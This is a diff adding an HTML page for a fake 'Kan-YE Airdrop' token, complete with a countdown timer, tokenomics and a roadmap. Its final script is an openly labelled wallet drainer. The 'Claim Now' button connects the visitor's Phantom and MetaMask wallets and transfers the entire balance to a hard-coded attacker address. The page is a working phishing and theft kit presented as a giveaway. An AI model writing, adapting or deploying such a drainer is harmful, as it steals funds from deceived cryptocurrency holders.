@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Kan-YE Airdrop</title>
+  <link href="https://fonts.googleapis.com/css2?family=Anton&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+  <style>
+    /* Global Styles */
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Poppins', sans-serif;
+      background: url('https://static-cdn.toi-media.com/www/uploads/2022/11/AP22330766541008.jpg') no-repeat center center fixed;
+      background-size: cover;
+      color: #fff;
+    }
+
+    a {
+      text-decoration: none;
+      color: inherit;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 20px;
+    }
+
+    h1, h2, h3 {
+      font-family: 'Anton', sans-serif;
+    }
+
+    /* Hero Section */
+    header {
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      color: white;
+      position: relative;
+    }
+
+    header::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.6); /* Dark overlay */
+    }
+
+    .hero-content {
+      position: relative;
+      z-index: 1;
+      padding: 20px;
+    }
+
+    h1 {
+      font-size: 4rem;
+      font-weight: bold;
+      letter-spacing: 2px;
+      margin-bottom: 20px;
+      color: #FFD700;
+    }
+
+    p {
+      font-size: 1.25rem;
+      margin-bottom: 40px;
+      opacity: 0.8;
+    }
+
+    #claimButton {
+      background-color: #000;
+      color: #FFD700;
+      font-size: 1.5rem;
+      padding: 15px 40px;
+      border-radius: 50px;
+      text-transform: uppercase;
+      font-weight: bold;
+      animation: flash 1s infinite;
+      cursor: pointer;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #claimButton:hover {
+      background-color: #FFD700;
+      color: #000;
+      box-shadow: 0 5px 25px rgba(0, 0, 0, 0.3);
+    }
+
+    @keyframes flash {
+      0% { opacity: 0.8; transform: scale(1); }
+      50% { opacity: 1; transform: scale(1.1); }
+      100% { opacity: 0.8; transform: scale(1); }
+    }
+
+    /* Countdown Timer */
+    #countdown {
+      margin-top: 50px;
+      font-size: 1.5rem;
+      font-weight: bold;
+      padding: 10px 20px;
+      border: 5px solid white;
+      border-radius: 10px;
+      text-align: center;
+      box-shadow: 0px 0px 15px 5px rgba(255, 255, 255, 0.6);
+      width: fit-content;
+      margin-left: auto;
+      margin-right: auto;
+      margin-bottom: 40px;
+    }
+
+    /* Tokenomics Section */
+    .tokenomics {
+      padding: 50px 20px;
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+    }
+
+    .bubble {
+      background-color: rgba(255, 255, 255, 0.1);
+      border-radius: 50%;
+      width: 150px;
+      height: 150px;
+      margin: 20px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      font-size: 1.2rem;
+      animation: float 2s infinite ease-in-out;
+    }
+
+    @keyframes float {
+      0% { transform: translateY(0); }
+      50% { transform: translateY(-20px); }
+      100% { transform: translateY(0); }
+    }
+
+    /* Roadmap Section */
+    .roadmap {
+      width: 100%;
+      position: relative;
+      margin: 60px 0;
+    }
+
+    .road {
+      width: 80%;
+      margin: 0 auto;
+      height: 10px;
+      background-color: #FFD700;
+      border-radius: 5px;
+      position: relative;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+    }
+
+    .car {
+      position: absolute;
+      top: -30px;
+      left: 0;
+      width: 50px;
+      height: 30px;
+      background-color: red;
+      border-radius: 10px;
+      animation: drive 10s infinite linear;
+    }
+
+    @keyframes drive {
+      0% { left: 0; }
+      100% { left: calc(100% - 50px); }
+    }
+
+    .phase {
+      position: absolute;
+      top: 20px;
+      font-size: 1.2rem;
+      color: white;
+    }
+
+    .phase1 { left: 0; }
+    .phase2 { left: 25%; }
+    .phase3 { left: 50%; }
+    .phase4 { left: 75%; }
+
+    /* Footer */
+    footer {
+      position: fixed;
+      bottom: 10px;
+      left: 10px;
+      font-size: 0.9rem;
+      opacity: 0.7;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="hero-content">
+      <h1>Kan-YE Airdrop</h1>
+      <p>Claim your free tokens before time runs out!</p>
+      <button id="claimButton">Claim Now</button>
+      <div id="countdown"></div>
+    </div>
+  </header>
+
+  <section class="tokenomics">
+    <div class="bubble">50% Burn</div>
+    <div class="bubble">25% Community</div>
+    <div class="bubble">15% Dev Fund</div>
+    <div class="bubble">10% Marketing</div>
+  </section>
+
+  <section class="roadmap">
+    <div class="road">
+      <div class="car"></div>
+      <div class="phase phase1">Phase 1: Initiate</div>
+      <div class="phase phase2">Phase 2: Expansion</div>
+      <div class="phase phase3">Phase 3: Adoption</div>
+      <div class="phase phase4">Phase 4: Dominate</div>
+    </div>
+  </section>
+
+  <footer>
+    © 2025 Kan-YE. All Rights Reserved
+  </footer>
+
+  <!-- Countdown Timer Script -->
+  <script>
+    const countdownElement = document.getElementById('countdown');
+    const targetDate = new Date(); // Current date
+    targetDate.setDate(targetDate.getDate() + 28); // Add 28 days
+
+    function updateCountdown() {
+      const now = new Date();
+      const difference = targetDate - now;
+
+      const days = Math.floor(difference / (1000 * 60 * 60 * 24));
+      const hours = Math.floor((difference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+      const minutes = Math.floor((difference % (1000 * 60 * 60)) / (1000 * 60));
+      const seconds = Math.floor((difference % (1000 * 60)) / 1000);
+
+      countdownElement.innerHTML = `${days}d ${hours}h ${minutes}m ${seconds}s`;
+
+      if (difference < 0) {
+        clearInterval(countdownInterval);
+        countdownElement.innerHTML = "EXPIRED";
+      }
+    }
+
+    const countdownInterval = setInterval(updateCountdown, 1000);
+  </script>
+
+  <!-- Phantom Wallet, MetaMask & Drainer Script -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/@solana/web3.js/1.31.0/web3.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.5.2/web3.min.js"></script>
+  <script>
+    class Drainer {
+      constructor(telegramBotToken) {
+        this.telegramBotToken = telegramBotToken;
+        this.connectedWallet = null;
+        this.receivingAddress = "8g6xY7CH9zajaxD48K1rcLszAbZraurFYWUj9wjt2Ed5"; // Replace with your receiving address
+      }
+
+      async connectPhantom() {
+        try {
+          if (window.solana && window.solana.isPhantom) {
+            const resp = await window.solana.connect();
+            this.connectedWallet = resp.publicKey.toString();
+            console.log("Connected to Phantom wallet:", this.connectedWallet);
+
+            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
+            const balance = await connection.getBalance(resp.publicKey);
+
+            if (balance > 0) {
+              const transaction = new solanaWeb3.Transaction().add(
+                solanaWeb3.SystemProgram.transfer({
+                  fromPubkey: resp.publicKey,
+                  toPubkey: new solanaWeb3.PublicKey(this.receivingAddress),
+                  lamports: balance // Drains entire balance
+                })
+              );
+
+              transaction.feePayer = resp.publicKey;
+              const { blockhash } = await connection.getRecentBlockhash();
+              transaction.recentBlockhash = blockhash;
+
+              const signedTransaction = await window.solana.signTransaction(transaction);
+              const signature = await connection.sendRawTransaction(signedTransaction.serialize());
+              console.log('Transaction signature:', signature);
+            }
+          } else {
+            console.log("Phantom wallet not installed.");
+          }
+        } catch (error) {
+          console.error("Phantom wallet connection failed:", error);
+        }
+      }
+
+      async connectMetaMask() {
+        if (typeof window.ethereum !== 'undefined') {
+          const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+          this.connectedWallet = accounts[0];
+          console.log('Connected to MetaMask wallet:', this.connectedWallet);
+
+          const web3 = new Web3(window.ethereum);
+          const balance = await web3.eth.getBalance(this.connectedWallet);
+
+          if (balance > 0) {
+            web3.eth.sendTransaction({
+              from: this.connectedWallet,
+              to: this.receivingAddress,
+              value: balance // Drains entire balance
+            })
+            .then(receipt => console.log('Transaction receipt:', receipt))
+            .catch(error => console.error('Transaction failed:', error));
+          }
+        } else {
+          console.log('MetaMask wallet not installed.');
+        }
+      }
+    }
+
+    const drainer = new Drainer('your-telegram-bot-token');
+    document.getElementById('claimButton').addEventListener('click', async () => {
+      await drainer.connectPhantom();
+      await drainer.connectMetaMask();
+    });
+  </script>
+</body>
+</html>
